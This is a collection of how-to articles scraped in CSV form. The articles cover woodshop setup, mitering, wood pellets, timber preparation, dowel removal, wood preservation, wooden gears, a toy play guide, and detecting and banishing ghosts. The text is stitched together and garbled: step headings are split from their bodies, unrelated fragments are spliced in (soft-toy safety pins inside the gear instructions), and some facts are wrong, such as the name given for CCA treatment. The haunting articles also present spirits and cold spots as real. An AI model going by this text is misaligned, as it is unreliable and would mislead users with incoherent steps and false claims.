, If your work is rough, the finish you are using has raised the grain of the wood, and you will need to re-sand it before applying a final coat. Use a fine paper for this step, as you are not wanting to remove any excess wood in this step.

,
Consider installing peg board panels behind workbenches or on walls where hand tools and other items can be hung for easy access.

,
Begin building or remodelling the space you plan to use for your workshop with an understanding that very few wood workers have the luxury of a shop with all the room and equipment they will ever need, and sacrifices and compromises are almost inevitable, but planning and coordination will make the process easier and more successful.

",How to Set Up a Woodshop," Once you have spent time planning and installing your equipment, it is an awful feeling to realize you can't function effectively in your shop. Here are some basic items to consider when you plan your shop.


List the major tools you plan to install in your workshop, using the footprint and user space required for each. Here are examples:

Table saws are about four feet by four feet, and require room to stand and feed material from at the front, and room to allow material to discharge after it has been cut. This means you need an area over six feet wide, and at least ten feet long for this one machine.
Miter saws are generally smaller machines, as small as two feet wide and two feet deep, and the lumber is put in front of the saw to be cut, so you need at least six feet of width, and two feet of depth for this machine.
Band saws and scroll saws are fairly small machines as well, and for cutting small items, they can be operated in a space of about three feet by five feet when they are set up on an independent stand built for them.
Table mounted routers, planers and shapers are another machine that usually has material fed through, and although they are fairly narrow machines, they require room on their front for material to be fed from, and at the rear for the material to be removed after the work is complete, so again, a space of about ten feet is needed for any significant work.


Look at bench and table space you will need for assembling projects and mounting bench top machines. A workbench about three feet deep and six feet long will do for many ordinary projects, but most woodworkers would rather have too much space than to be crowded with too little.
Consider how you will store material if you plan on storing more than just what you will use on individual projects, and remember, it is often less expensive to buy in larger quantities, and having spare material in the event of a mistake can keep a project going, rather than taking a trip to the local lumberyard.;
, You should also remember that many tools require a fairly substantial amperage to operate, so you need to make sure the wiring is capable of handling the loads. 20 Amp circuits will work for ordinary 120V tools, but air compressors and welders may require 40 Amp, 220V circuits.

, Cutting and sanding produces a lot of dust, and you may find it is difficult to breathe when the atmosphere is full of this stuff. Also, when using paints, stains, and adhesives you can find an explosive atmosphere is possible if ventilation is not maintained.

, A roll-up door is wonderful if you can swing it, a double door will work, but if possible, plan to have at least a three foot door for your main entrance.

, A standard eight foot ceiling is fine for a residence, but flipping an eight foot sheet of plywood in a workshop with an eight foot ceiling is next to impossible. If you are building your shop from scratch, consider a ten foot ceiling.

, Leave walkways around the machines, and estimate the space handling materials will require for each.

, You can also compromise by installing combination machines that can perform the job of more than one, single purpose machine.

Use a notch joint.",How to Miter Corners," There are a couple of different tools that you can use to miter corners and what you can use will depend on what you're cutting and how it needs to be cut. Basic, standard cuts can be done on simple materials using a miter box and a hand saw. More complex cuts will need a circular or table saw. These can be rented from your local big box hardware store and they can advise on exactly which type of machine you need.


For many interior molding situations such as baseboard and crown, etc., you should not miter the inside corners. It won't fit right and miters tend to separate in these situations. For inside corners, you should learn a technique called ""coping."" This is not difficult (do a search for instructions).;
, Measure the complete angle change. Divide that by the number of pieces that will make the turn. The resulting number is the angle to which you will need to set your miter. The most common miter angle is 45 degrees.








, Since the cuts are angled, you'll have one side of the wood longer than the other. You'll need to keep track of which side will be which and make your measurements correctly. For example, on an inside corner piece, the measurement of the wall will need to equal the longer, back side of the wood. For an outside corner piece, the inside will need to be equal to the wall but will b the shorter distance.








, If you want to make use of as much wood as possible, you'll want to be able to use scraps whenever you can. Because the piece will need to be longer on one side then what might actually appear (such as on inside corners), you'll need to be able to calculate how much extra material you'll need at the end. If your mitered corner is at the standard 45 degree angle((360/2)/corners), then you'll need a gap at the end equal to the depth of the piece of wood.


If you're using a non-45 angle, you'll need to do some math. Don't worry: it's easier than it sounds. Use a calculator or the interactive circle on this page to find the sin and cos for the angle of the cut you're making. Next, take your calculator and divide the sin by the cos. Take the resulting number and multiply it by the depth of your wood. The resulting number is how much extra space you'll need.

, Set the miter saw to the angle it will need to cut at. Use the included instructions for your machine, as each is different.

, Place the wood on the machine so that it is upside down, when possible. Always make sure you know where the short and long sides of your wood need to be. Make use of a laser guide if your machine has one (most newer machines do). If you're unsure about how a piece of wood is lined up, keep scrap wood handy to test the cut on. Testing is important.


When cutting a picture frame style cut, place the flat side on the cutting surface.
When cutting a box style cut, place the flat side against the fence (or back piece of the cutting surface).

, If you are not using a piece long enough to hold and have your hands well out of the way of the saw, you should use clamps to hold the wood in place. Seriously, a lot of people lose fingers this way. Be careful.

, Usually there are a series of buttons and actions you have to take to start and lower the saw. Follow the instructions that came with the machine you have. When you lower the saw, keep your hands away and do not press down very hard. Simply guide it to where it needs to go and let the saw do the cutting.








, Once it's done, you can unclamp and remove your piece.








, No matter what method of joining you use, using clamps to keep the joint steady while it sets in important. There are lots of different styles of clamps depending on what project you're working on. See your local hardware store for help choosing what's right for you.

, The most basic way to join the pieces is to glue the angles, fit them together, and then nail them into place using a pneumatic brad nailer. This works best if the pieces can be nailed onto something else, like a door frame, because the ends will not hold together well. Set the nails if they do not go in far enough with a nail setter, then fill the holes with wood putty and stain or paint the putty to match the wood.








, You can drill dowel holes and place dowels in the joined ends of the wood if it is thick enough. This can add support and make the joint much stronger. Simply drill the hole, cover a dowel in wood glue, and join the pieces. Use a dowel size appropriate to the thickness of your wood.

, Once the ends are joined, you can also try a notch joint. Using a thick circular saw, cut a notch in the corner of the joint. Then, fill the notch with glue and fit in a triangular shim, cut to the correct size and shape. This is a more advanced method but can be beautiful if done correctly.

Sieve the pellets that did not form properly.,
Cool the pellets thoroughly.,
Bag and store the pellets.",How to Make Wood Pellets," Chip or shred the raw materials until the pieces are no larger than 1 inch (2.5 cm). Use a hammer mill to reduce the size of the wood even further. Get the pieces as small as possible without turning it into sawdust.;
, Content moisture should be 10 to 20 percent. Leave the wood in the sun to dry naturally, or place the wood pieces in an industrial slow heating oven until it is dried to the desired moisture level.

, Pouring it into the mixer will ensure all of the wood pieces become uniform and consistent in density, moisture and size. Make sure there is a rolling drum or an agitator working with the batch mixer.

, The die is a metal piece with holes drilled through it. The roller goes across the die and presses the wood through the holes into pieces the size of finished pellets. Pellet presses are flat die or round die. Either types can be used to make wood pellets that are consistent in density and moisture level.

, Some pieces will fall apart or break during the pressing process. Separate the improperly formed pieces by shaking or sifting them through a screen.

, When the pellets come out of the pellet press, they will be hot and moist. Spread them out and allow them to cool and dry naturally.

, Put the pellets in plastic bags that are not too big that they cannot be transported, and seal the bags. The pellets will need to be stored in a dry place where they will not become moist.

Cut the individual pieces you need from the plank of wood.,
Joint one face first, the flattest face first.,
Plane one end (let's call it the toe).

,
Joint the other end.,
You'll know when you're nearly done because you'll only see the last few remains of the rough sawed surface.

,
You know the surface is done when light reflects evenly from the surface.

,
Use the new flat jointed face to create a true 90 degree edge.,
The remaining rough face is planed parallel to the already planed face by putting it through a planer.

,
Cut the board to width on a table saw, with the jointed edge against the saw fence.

",How to Prepare Rough Sawn Timber for Woodworking," Make sure you cut them larger than the final size, to allow for loss from machining.It is Recommended to add 1 centimeter (0.4 in) all around, but you can probably reduce this if you cut very straight lines and are able to joint the edges without removing too much wood.;
, Place the wood so that the cup is down.

,, Let's call that the heel. Continue on both toe and heel to achieve the most from the rough cupped wood.

,,, Hold the wood up against the vertical guide and joint one edge.

Get a drill that is about one tenth the size of the dowel.,
Fill the cavity at the bottom of the dowel with engine oil using a syringe until no air in the cavity and in the drill hole.

,
Break a same size drill in half so that you only have the shank of the drill that will fit snugly in the drill hole.,
Position the drill in the hole and tap with a hammer.,
Repeat several times by filling the hole and hammer the punch in until the dowel is out.

",How to Remove Tight Dowel Pins," Drill a hole in the middle of the dowel right through the dowel.
,, Use this as a punch.

, The hydraulic effect of the force on the oil will multiply in the cavity and slowly force the dowel out.

Learn about the causes of wood to fail to perform its function.,
Use the best material you can find for your project.,
Consider non-wood alternative products for areas of special concern.,
Install the lumber so that it has minimal exposure to the elements.,
Keep wood dry during construction.,
Make sure the wood is dry before painting if you plan to paint it.,
Use fasteners correctly when building.,
Caulk, prime, and paint boards that are exposed to the weather.",How to Make Wood Used in Construction Last Longer," There are basically four causes of wood failure:


Structural failure due to poor design or wood selection.

Choose a material that is strong and sound enough for the application. The Wood Building Products Association publishes tables for use in determining the load bearing rating of structural lumber for spans between supports for joists and other structural applications. This information will help you select the best type of lumber and size it correctly for building purposes.
Look for loose knots, splits, warping, cracking, and other visible signs of damage in each piece of lumber you use.
Be aware that the crown or curve of a structural member such as a floor joist or ceiling joist should be up, so that if the board should sag, it will become flatter, as opposed to becoming more bowed.


Structural damage to the lumber in installation.

Make sure you do not split or crack wood when installing it. Keep fasteners as far from the edge or end of the board as possible to decrease the chance of the board splitting.
Use large/long enough fasteners to fully penetrate the lumber being nailed and to embed sufficiently in the supporting lumber to join the two pieces solidly.
Use mechanical connections when nailing or screwing will not support the lumber. Simpson products manufacture engineered connectors for almost any connecting application. Other manufacturers also offer these, including joist hangers, hurricane clips, straps, and connectors.
Use adhesives where it is practical. Strong adhesives can keep wood connections stationary to prevent fastener failure, and are often used as the sole connection product.


Damage due to rot, decay, or insect damage.

Use chemically treated wood where needed. This product is treated to resist insects, fungi, and other environmental factors that can destroy wood.
Pay attention to ends of lumber, especially when the end can be exposed to moisture. An example would be an exterior door frame, which may be exposed to a blowing rain. These frequently begin to rot out at the bottom if the bottom and inside surface isn't primed before installation.
Caulk or seal any lumber that may be exposed to weather.


Weathering is caused by environmental factors, particularly a cycle of being wet and then drying, which can cause wood grain to swell and then shrink, leading to cracking and splitting and the general deterioration of the wood.

Preventing exposure to the elements where possible is the best protection against weathering.
Painting exposed wood with a protective coating, sealant, or paint is effective for prevention of weathering, but requires routine repainting and maintenance.

;
, Chemically treated lumber has the benefit of pesticides and fungicides that are introduced into the wood itself to protect it from these destructive organisms. Here are some treated wood options and some natural alternatives.


CCA treated wood contains copper chlorinated arsenic, and will prevent damage from termites and other wood consuming insects in most conditions, depending on the amount of treatment and exposure to water which may leech the chemicals out over a period of time. This lumber is usually labeled for its recommended use, such as above ground or below grade.
Naturally insect and moisture resistant woods. These may contain resinous sap which makes the wood waterproof, or in woods like cedar, redwood, juniper, or cypress, the oils contained in the wood is insect repellent itself.
Dense, tight-grained woods like teak or ipe (pronounced ""ee-pay"") have a cellular structure that simply won't allow water or insects to penetrate it.

, You may find a synthetic material that is made from recycled plastics a better choice for locations where natural lumber will require periodic maintenance to keep in good condition. Here are other possibilities to consider:


Galvanized metal can and is used for framing and other structural applications, and is insect proof and corrosion resistant.
Cementitious board products like Hardy siding and dimensional material is also insect and moisture proof, and also will not burn.

, This can be accomplished by using plastic sheathing or coatings to protect the wood if it isn't inside a dry structure.


Use a moisture resistant barrier like Tyvek House Wrap or polyethylene sheeting to cover the wood where it will be covered by a veneer or siding, such as in an exterior wall.
Paint the wood with a waterproofing sealer like Thompson's Water seal, or an oil based enamel undercoat to keep water out of the wood.

, Installing wet wood in an area with little or no ventilation will increase the likelihood it will rot. Normally, lumber sold for construction is kiln dried to less than 12% moisture. Keeping the wood stored in a dry location will maintain the low moisture content until the area it is used in is dried in.

, Painting wood with a high moisture content will trap that moisture in the wood, and can contribute to rot in the future. Damp wood will also prevent the paint from bonding and can cause it to peel and blister.

, Driving nails too deep into a board can create a pocket for water to soak in. Here are other things to take note of:


Use the correct fastener for the wood and the application.

For dry locations where a strong connection is required, full head cement coated nails are recommended.
For woods like cedar and juniper, bronze, stainless, or aluminum nails should be used, as other nails will react with the oils in the wood.
For exposed fasteners, such as a fence or deck, hot dipped galvanized steel nails may be used in pine lumber. You may choose corrosion resistant coated or stainless steel screws instead.
Adhesives offer an alternative where mechanical fasteners are not desirable. There are a number of interior and exterior grade construction adhesives available, including water resistant and waterproof products, depending on your needs.



, This will require maintenance, but will help make sure your wood project lasts for a long, long time.

Receive access to a workshop.,
Gather the right plywood.,
Use safety supplies.,
Obtain a template.",How to Make Wooden Gears1," To make wooden gears, you should have access to a wood work studio. You’ll need access to a band saw or jigsaw, an awl, brad point drill bits (5/16 or 8mm), and a wood rasp. You’ll also need access to a printer, a smooth shank, and short wood screws.;
, You’ll need to use Baltic birch plywood because it is very durable. You’ll recognize this type of plywood based on the several layers within the wood. You could alternatively use UHMW plastic, Masonite, or phenolic resin material.


Avoid using spruce or fir plywood because it is simply not strong enough., When handling this type of equipment it may be wise to use some safety precautions. First, never allow a young child to operate any large machinery unsupervised. Though it is not required, wear safety glasses while operating the larger machines. There’s a chance of a small scrap of wood to pierce your eye.

, Go online to a free wood generator like https://woodgears.ca/gear_cutting/template.html for your template. A generator like this allows you to modify all the aspects like tooth spacing, number of teeth, number of spokes and more. When you’ve created the right sized gears, print them off. Templates generally have two different sized gears. The template will allow you to make size adjustments without messing up the gear ratio. The template is designed to adjust both large and small gears together. The teeth will be the same size for both sized gears to ensure a smooth rotation.


Generators like this even let you animate your design to test how it works.
There are more sophisticated gear templates that are available for download as well.
You can also create your own template using paper, pencil, and a protractor.

, You will probably have some in the sewing basket or stash of baby's things but if not, get some from the craft store or the haberdashery section of a general store.

, Thread the rest of the pin over the clothes line and pin into place.

, The safety pin will keep the soft toy hanging easily and there won't be any marks, damp spots, or falling soft toys.

, Forgotten pins can cause harm to young children.

Cut out your templates.,
Glue the schematic to the wood.,
Cut out the wood.,
Punch divots into each tooth.,
Drill holes in between each tooth.,
Prepare your band saw.,
Cut out your gears.,
Remove the outline.,
Add wood varnish.",How to Make Wooden Gears2," After printing out your template onto paper, you’re ready to cut out the template. There is no need to individually cut out a slot for each gear on paper. Simply cut out the full circumference of the circle with the gear’s teeth intact. Do this for both gears.








, Once the paper templates are cut out, you’ll need to attach them to the plywood. Use wood glue for the best hold. You shouldn’t use standard glue because it won’t stick as well to the wood.









It is important that the schematic stays intact while you make your cuts.Allow around an hour for the glue to dry and settle to ensure nothing will mess up.

, Once your schematic is glued onto the plywood, you’re ready to cut out the plywood’s circumference. Use a band saw or a jigsaw to cut out the full circle. Be sure not to puncture any of the gears. To be safe, it is better to cut out a larger circumference than your design calls for.








If you are inexperienced working these types of power tools, ask for assistance from an experienced woodworker. Typically work studios have technicians that are there to assist. Utilize the resources around you.

, You’ll need to use an awl which is a tool with a pointed spike. Use an awl to puncture small holes (or divots) in between each tooth. Position the awl above the line between the teeth. Once the awl is in place simply bang on its butt to create a divot into the wood.









This will act as your guide for when you use your drill., Now that you have outlined where each hole will be, it’s time to create the initial holes to guide your future cuts. Use a 5/16 brad point drill for each hole. Go along the gear's rotation and create a hole using the divot created earlier as a guide. Align the drill onto the divot and commence drilling.









It’s okay if the drill holes vary from the template’s design.Again, seek out someone with experience if you’re unsure how to use the tool.

, You’ll need to make the teeth cuts at an angle for the best rotation. Tilt the table holding the wood slightly when making the cuts for the teeth of the gears. Tilt the table to the right when cutting the left lines. Then tilt the table to the left when cutting out the right lines.









If your band saw table doesn’t let you tilt to the left, you can prepare it to work. Insert a piece of plywood underneath the spacer to create a left angle., You can either use a bandsaw or a jigsaw to make the final cuts for the teeth. Take time to do one side at a time to create the proper angles that will produce a smooth gear rotation. Start with right line of each tooth and cut the lines at an angle to the left. Then adjust your angle to the right and cut out all the left lines.









Assure that the outer lines match the lines on the template. Cut out parts of the wood that extend beyond the template's line when finished. Do this if you were cautious and cut out a circumference larger than your template.
Use your drill to cut out the center hole where the gear will rotate around., Use a belt sander to remove the template from the gears. You can also chip it off using a flathead screwdriver or even use sandpaper. The belt sander can be a messy process and shouldn’t be handled by someone inexperienced.








, Apply a coat of wood varnish around the teeth and on the base to ensure the wood doesn’t decay. Start with one coat and add another coat after testing the gears and ensuring everything works."
"
Attach a handle.,
Connect the gears.,
Test the gears.",How to Make Wooden Gears3," Use your wooden shank as a handle for the larger gear. If you don’t have a smooth shank you can use any piece of spare wood available to you. Position the shank on the outer part of the gear without overlapping into the gears, and then attach it using wood glue. Add a small wood screw to ensure a secure connection.







, Connect the gears to a contraption like a box joint in order to test them properly. If you don’t have a contraption already built, you can create your own test contraption. The key is for the smaller gear to be positioned vertically and the larger gear to be at a 90 degree angle. You can create stands out of spare wood that attach to the gears at their center point.







, Ensure that there isn’t any place where the gears seem to struggle. Take note of any location where there seems to be a resistance with a pencil.









If your teeth are of unequal size, you'll have to remove some material from the groove between the teeth.Use your wood filer to file away any resistance you experience as the gears turn.

Listen for sounds.,
Feel the temperature.,
Consider how you feel.,
Listen for knocking.,
Check the animals.,
Notice any disturbances.,
Consider any illness signs.",How to Verify Signs of a Haunting," Phantom sounds can take the form of voices, music or repetitive noises that occur at regular intervals. The characteristic sound of footsteps in the night, laughing, crying or music that occur at regular intervals are attributed to a residual haunting. Intelligent or inhuman spirits may create sounds to get your attention or to communicate with you in some way. You may experience the sounds of knocking, tapping or scratching in the wall or loud crashes and bangs with no identifiable cause. Each is characteristic of specific types of hauntings.;
, Cold spots with no physical reason often accompany hauntings. The theory is that spirits need energy to manifest and draw energy from the surroundings, resulting in an area colder than the surrounding air by as much as 20 to 40 degrees. The cold spot seldom remains in one area for a prolonged period and may precede a manifestation or other paranormal activity.

, Unusual physical sensations may signal paranormal activity. Dizziness, light headedness, a feeling of oppression or pressure on the chest, or nausea may suddenly become overwhelming when a spirit is present. Other physical sensations include the feeling of being touched, the feeling of being watched, hair standing on end or extreme apprehension.


Unusual or unexplained physical and/or emotional feelings: experience being touched by something that cannot be seen, either lightly or with more aggression. In addition, clients frequently report the sensation of being watched by something unseen and the latter assertion is not in conjunction with any form of paranoia.

, Rapping and banging: unexplained banging, rapping, and strange sounds are commonly reported by individuals experiencing paranormal phenomena. Rapping and banging are also commonly reported on sites experiencing poltergeist activity.

, Animals behaving strangely: people are not seemingly alone when it comes to experiencing the paranormal; many animals living in haunted locations or locations where activity occurs also experience paranormal activity.

, Sudden unexplainable activity after recent remodeling of the location: A large number of the sites investigated by paranormal investigators in the field have been remodeled prior to the commencement of strange, unexplained activity. Some theories suggest that remodeling and paranormal activity is inextricably linked, and one theory suggests that any spirits/entities attached to a location are displeased with the changes that remodeling produces so they act out accordingly. Meanwhile, other theories suggest that remodeling creates noise disturbances, and therefore is simultaneously creating vibrational disturbances as well.

, Physical illness with no medical relief or reason: In some cases, individuals will report having the sudden onset of rare illnesses, or un-diagnosable ailments after moving into a location that is paranormally active. Lesser signs of illness are also reported and include sleep disturbances, fatigue, and general malaise with little or no relief while in the location in question. When the individual is free of the location however, the latter symptoms either fade or disappear all together.

",How to Play With Sylvanian Families," It doesn't need to be a fancy one like the hotel, a little one like Daisy cottage will do. If you can`t buy a house, use a cardboard box and make a bit of furniture for it. Now you can start playing!;
, If you have more than one house they can go to each others for sleepovers, lunch or dinner, to play, to camp together, etc. They can also sit next to each other at school.

, The mums can go on shopping sprees while the dads go round each others and watch the football. The same for uncles, aunts, grandmothers and grandfathers.

, They can go camping, go to the seaside, the farm, on the boat, the Grand Hotel even! You can get cases for them in certain sets like the hotel, the family cars and the guest room furniture set. If not, you can make them or buy them at a doll house store like the Doll House Emporium.

, The most recent one is Berry Grove. It comes with 12 chairs so 6 can go on the ground floor and 6 can go on the top floor. Buy one of the lesson packs if you have more than 12 children or you get given Sylvanians often as the school fills up very quickly! Here is everything you can buy for the school: the school sports day set, the dinner lady and lollipop man, the school pupils set. The school dinners set, the school nurse and accessory set, the school play set and the music lesson set with the teacher. You can also buy some other sets online. You can have children pack their backpacks and go to school on the bus or have them walk. They can have their lessons and play outside. Don`t let them forget their pack lunches or dinner money!

, You can buy a bus, a playground and the toilets for them. Send them to school on the bus with their pack lunches, they can read books, build with blocks, learn their A B Cs and have music lessons once they get there. They can eat their lunch and play in the playground too!

, Try to give them jobs that they do if you can(this can be found on the back of the boxes that the families come in or on the website). Like Matilda Billabong works in the nursery, so Try to give her that job. Daisy Buttercup is very chatty, so a shop job would work well. The Buckley parents are school teachers, etc.

, Good food packs are the breakfast set, the scrumptious sandwiches set, the dinner for 2 set, the kitchen cookery set and the lunch set. You can also buy the Blackcurrant Cafe and the Courtyard Restaurant and shops like the cake or sweet shop.

, You can buy bedroom sets like the children`s bedroom set, the triple baby bunk beds and the master bedroom set.

Follow the guidance of investigators.",How to Tell if Your House Is Haunted," There are different levels of phenomena in hauntings because they aren't all the same. There can be single phenomenons and many different phenomena in hauntings. ,


Listen for any other voices or noises if you are home alone. You will most likely hear these sounds in the distance. Some sounds you might hear in a haunted house would be footsteps, knocks, banging, rapping,slamming, scratching sounds, or sounds of something being dropped. These noises can range from quiet to extremely loud. Check to see if you ever find doors opened or closed when you are certain the door wasn't positioned like that before. Also, look for electrical items turning on and off unexpectedly. You will probably not witness this type of phenomena taking place. Discover if items are disappearing and reappearing. Look in a certain spot for something that is always there; if it's not, keep your eyes open. Usually, the item will be found in an obvious spot ranging from a day to a few weeks. It would be as if someone or something took an object for a while, then returned it to its normal spot. Check for unexplained shadows. This means you might be seeing shapes and shadows from the corner of your eye. The shadows will probably be similar in form to a human, but sometimes they can be smaller and hard to distinguish. Notice if you feel like you're being watched or touched by someone or something that isn't visible. For example, something might brush up against your arm when you are standing in an empty room. An extreme and very rare example would be getting slapped or punched by the invisible someone or something. Listen for muffled cries and whispers. You might hear music playing from an unknown area or your name being said by someone or something who isn't there. Look for moving objects. Some examples would be dinner plates moving across the table, pictures falling off walls, and furniture sliding across the floor. Pay attention to cold spots as some believe that this means there is a ghost in the room.

Pay attention to unusual smells (i.e. perfume, smoke, flowers, food) that come from nowhere or out of the blue.


, It may be hard to dismiss some of the more extreme phenomena. The phenomena will most likely be taken more seriously if more than one person witnesses it happening.

, The local plumber might be able to help you explain why there are banging noises around the pipes. Carpenters can fix tables that wobble on their own or doors that close by themselves. Family or friends might be able to offer new explanations for why you are hearing or seeing a certain something. , Write down the date, time, and what the phenomena did in your journal when something unusual happens. If you are hearing strange noises a lot, it is good to record what you hear on the tape recorder for evidence. By doing this, you will be able to help out the paranormal investigators if you would like them to come to your house. , Haunted houses are usually the site of a historical tragedy of some sort. Find out who has owned the house before, and if anything unusual has happened in that home. A good reference librarian, your town hall, historical society, even history teacher can help get you started.


Contact the people who have lived in your house before you. Ask them if they ever noticed anything unusual, strange, or unexplained behavior while they were living there. If multiple people have lived in your house before you, be sure to contact as many as possible.


, Have them visit your house, and ask them if they notice anything unusual. Only call one if you are very certain your house is actually haunted. If you believe that your family may be in some kind of danger with the phenomena being in your house, don't be afraid to call for help as soon as possible. , If your house turns out to be haunted, then listen to what others tell you to do. If you don't like your house being haunted, try sprinkling holy water in the areas that seem most haunted.

Get psychiatric evaluation.,
Record your experiences.,
Have someone corroborate your findings.,

Be confident when dealing with your ghost.,

Cleanse the house.",How to Get a Ghost out of Your House," These low frequency hums can cause nausea, feelings of fear and even manifest shadows at the corners of your vision. These are caused by the vibrations of the infrasound, depending on the intensity of the sound wave. French robotics researcher, Vladimir Gavreau, allegedly produced such effects on himself and his fellow researchers through infrasound.Animals can pick up infrasound in ways that humans can't. Scientists believe that this might be how many animals can sense natural disasters.Building an infrasonic microphone. The antenna itself has to be bought, but these are easy to find at an electronics store and relatively inexpensive. Once you have the microphone, get a glass jar with the diameter of 2.25 inches (5.7 cm). Stretch a 12 inch (30.5 cm) balloon over the touch. Cut off the part of the balloon which you use to inflate it, and tape the rest tightly and without wrinkles to the jar. Tape an NdFeB type magnet of 1⁄2 inch (1.3 cm) to 1 inch (2.5 cm) diameter magnet of 5000 gauss or more (you can get this from Walmart). You will need an oscilloscope to convert the electrical signals into waveform patterns. These are more expensive, but can be found for about $45 on eBay.Alternately, call your local university's science department and see if they have any recommendations for putting together an infrasonic microphone.;
, Check around where the house is situated. Is there a garbage dump nearby? Sometimes methane gas can seep up through the ground, giving a smell of brimstone and bursts of fire.Often ghost sightings are simply light bouncing off of a reflective surface in an unusual way. Human sight and senses are incredibly error prone, so it can be difficult to trust what your eyes might be telling you without serious further investigation.

, Often people who see ""ghosts"" are primed to do so because of their mental health. Before you start doing odd things to your home, seek out some professional help. This doesn't mean that you don't have a ghost, it is simply a way to rule out one outside possibility.


Likewise, try to have someone confirm your experience. If you're the only one seeing or sensing anything, that's the best time to get psychiatric evaluation. If others experience the possible haunting as well, look first to other natural causes.

, Once you've gotten rid of any natural causes, you will need to catalog your haunting to better understand how to deal with it.


Use a record player to try to communicate with the haunting. Ask it questions and record it to see if the ghost answers. It won't always, but you may be given some sort of message which can help with getting rid of it. You will want to ask easy questions with simple answers, usually yes or no. This is simplest if you try to communicate with the ghost by asking questions and having it answer with knocking. Ask it to use one knock for yes and two knocks for no.
Take photos of the areas where you experience the haunting to see if anything turns up in the final image. Use a flash when you're in a dark space, like a room, otherwise your camera will only capture darkness. Otherwise, it is best to rely on natural lighting so that lens flare doesn't confuse you. Remember that often ghostly seeming orbs and other phenomena are often simply dust on the camera lens, or light refracting from dust particles in the air.

, See if your family members, or roommates sense and see similar things to you. Do they hear ghostly footsteps, a knock on the bedroom door, or other manifestations? Try not to influence them with your own findings.


If you can find a reputable ghost hunter or psychic, talk to them about what you've discovered and see what they think. If you can afford it, have them come to your house and see what they can find separate from your experiences.

, As any reputable ghost hunter will tell you, most of the ghostly visitations turn out to have a natural explanation. That doesn't mean ghosts don't exist!

, Like animals, ghosts are supposed to react to and feed off of fear. Since there are very few (if any) true cases where someone was hurt by a ghost, mostly what you'll be dealing with is irritating and possibly unsettling.


If you talk to the ghost, use a no-nonsense tone of voice, as you would with a misbehaving animal. Be stern, but not mean. Ghosts may be the left-over spirits of other people. The fact that they are dead might already be traumatizing to the ghost.

, This is specifically for Christians, as an exorcism means casting out Satan and his minions. If you aren't Christian, this way will be unlikely to work for you. Check in your specific religion, as all religions have possibilities for dealing with a type of spirit world. If you are Christian, don't perform the exorcism yourself. Instead, contact a local church and see what they recommend.In Hinduism reaching the 3rd, 7th and 9th chapter of the Bhagavad Gita and offering the result to the ghost it will help release them from their bondage. Likewise, chanting mantras, keeping holy pictures of deities or burning incense offered during a Puja can help release the trapped spirit.
The Jewish ritual helps both the possessed and the possessor find healing. The ritual should only be performed by a rabbi who has mastered practical Kabbalah.
There are a variety of banishing rituals for all cultures and religions so you should be able to find one that suits your need. These rituals take into account different culture's views on ghosts and the afterlife, as there is no one true doctrine on ghosts.

, Once your ghost has been banished, you must cleanse the space so that it doesn't return and to discourage other spiritual and ghostly visitors. Again, there are as many ways to cleanse a physical space as there are religions in the world. The ones offered below are only some of the more common ones.


Burn sage or cedar. This is said to clear negative energy and burning incense is considered a purifying force in many cultures.
Ring a bell in each corner of your home. This is said to break up the negative energy and encourage positive energy. It is important to do this more than once as negative energy can come from many different sources.
Physically clean your home. This will help to create an atmosphere of cleanliness and to discourage negative energy from coming back.

Remember: before moving all of your stuff into the place, move in as few items as possible at first.,
Keep in mind while moving furniture or other objects in, be alert for any feelings you may have about where an item should be placed.,
Try to relate to the ghost by talking about what life may have been like in the house (if it is an old house), and try to do something former residents would have done in the house while they lived there, like eating some meals in a formal dining room, or listening to period music from the time the house was built.

, Doing this will give the ghost(s) a chance to scope you out, and accept your presence in 'their' home.

, This will avoid riling the ghost(s) to the changes going on during the transition from former occupants.

, If you can make a ghost happy by placing a chair in a particular place, it could save you lots of trouble later on.

,, For example, on October 29 of a year, try to talk about how past residents would have felt about the stock market crash and the beginning of the Great Depression (if the house is old enough).

, Try using the room as a storage area and leave the ghost alone.

, Some ghosts try to communicate with the living through dreams. Allowing the ghost to get its message to the living may put an end to the haunting and send the ghost on its way.

, While this may be difficult for some to do, most ghosts will leave you alone if you acknowledge their presence.

, Let it know it is welcome to stay if it leaves you and your family alone.

, Some ghosts can be persistently aggressive and this behavior may prevent you from sleeping or enjoying your home life the way you deserve to. If this happens, never respond in anger. This will only add fuel to the fire. Focus on feeling love for these entities that probably haven't felt love in a very long time (if ever). Directing positive energy toward them can be surprisingly effective in stopping unwanted behavior.

Rule out the obvious causes of ""other-worldly"" noises and issues first.,
Take an honest appraisal of your own health and stress levels.,
Ignore the alleged spirits as much as possible, not even giving them a passing thought.,
Have a religious leader, medium, or psychic examine the house if you are still unsure.",How to Exorcise Your House or Dwelling1," There are a lot of different signs and ideas behind spirits, and determining if your home possesses one is often the hardest thing to do, as the signs can be confusing and conflicting. What is important to remember is that very, very few houses are every possessed, and even fewer are visited by ""evil"" spirits, contrary to what Hollywood seems to think. Look out for:


Moving or disappearing and reappearing possessions, especially similar objects or the same object.
Electronics turning on and off on their own.
Unknown footsteps, doors/windows opening and closing, strange noises or voices.
A feeling like you are not alone ever, often combined with chills and sudden fear or panic.
Specific or recurring nightmares, especially those that seem to direct you to do something.
Extremely hot or cold spaces in the house, often confined to small areas.;
, This is the only way to keep your peace of mind if things get a little strange. Be scientific here, systematically examining or exploring where unknown noises or lights show up. No matter what you believe, a large dose of skepticism is healthy here. The need for exorcisms is rare -- and there are almost always common explanations for most ""unexplainable"" phenomenon.


Houses, no matter how old, all ""settle"" over time. The pieces shift and groan, boards move, and pipes whistle and bang. Older houses do this constantly, and this is the source of most noises.
Strange odors and smells commonly come from leaks or trapped moisture somewhere, especially after rains or floods.
Open windows, cleaning, and plain bad communication are the cause of most missing objects, not spirits.

, No one wants to be told ""it is all in their head,"" but that's why you simply must be honest with yourself when determining if it is a spirit or not. If you're already stressed out, not sleeping well, having trouble eating, or feeling generally under the weather, you are more likely to see and feel things out of the ordinary. Don't let the worry of a spirit ruin your mental and physical health -- keep taking care of yourself and spend some time relaxing. If the spirits fade away, they were likely the result of an overworked, overtired brain and body.

, What happens if you push the spirit out of your mind, since we frequently only see ""signs"" of ghosts and demons when we're looking for them? Remind yourself how rare these spirits really are and that anything you're worried about is likely a common occurrence or noise. Try to let the idea of a spirit ease off your mind. If things still happen or occur more rapidly, you might have an issue to investigate. More often than not, however, the ""spirits"" will disappear as soon as you stop thinking about them.


If there are spirits, they generally need and feed off of your attention, looking to make themselves known. Ignoring them generally keeps them in check if they are actually present., If you are under a lot of emotional and psychological stress because of a perceived spirit, open up to your spiritual leaders and ask their opinion and advice. You may want to consider inviting a psychic/medium to your home to ""have a look"" and determine if you need extra help. Oftentimes all the house needs is a quick energy clearing with a smudging stick or some incense.

